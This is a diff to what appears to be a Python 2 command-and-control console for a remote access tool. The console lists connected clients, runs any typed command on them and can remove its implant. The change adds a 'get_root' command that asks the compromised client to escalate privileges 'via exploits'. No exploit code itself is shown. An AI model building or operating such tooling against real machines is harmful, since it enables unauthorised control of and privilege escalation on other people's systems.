@@ -19,7 +19,7 @@ MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
 MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
 MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
 
-commands = ["help", "status", "clients", "connect", "get_info", "get_computer_name", "get_shell_info", "kill_client"]
+commands = ["help", "status", "clients", "connect", "get_info", "get_root", "get_computer_name", "get_shell_info", "kill_client"]
 status_messages = []
 
 # The ID of the client is it's place in the array
@@ -33,6 +33,7 @@ def print_help():
     print "clients         -  Show a list of clients."
     print "connect <ID>    -  Connect to the client."
     print "get_info        -  Show basic information about the client."
+    print "get_root        -  Attempt to get root via exploits."
     print "kill_client     -  Brutally kill the client (removes the server)."
     print "Any other command will be executed on the connected client."
 
@@ -163,6 +164,9 @@ if __name__ == '__main__':
                         if command == "get_info":
                             print MESSAGE_INFO + "Getting system information..."
                             print send_command(connections[current_client_id], "get_info")
+                        elif command == "get_root":
+                            print MESSAGE_INFO + "Attempting to get root, this may take a while..."
+                            print send_command(connections[current_client_id], "get_root")
                         elif command == "kill_client":
                             print MESSAGE_INFO + "Removing server..."
                             response = send_command(connections[current_client_id], "kill_client")
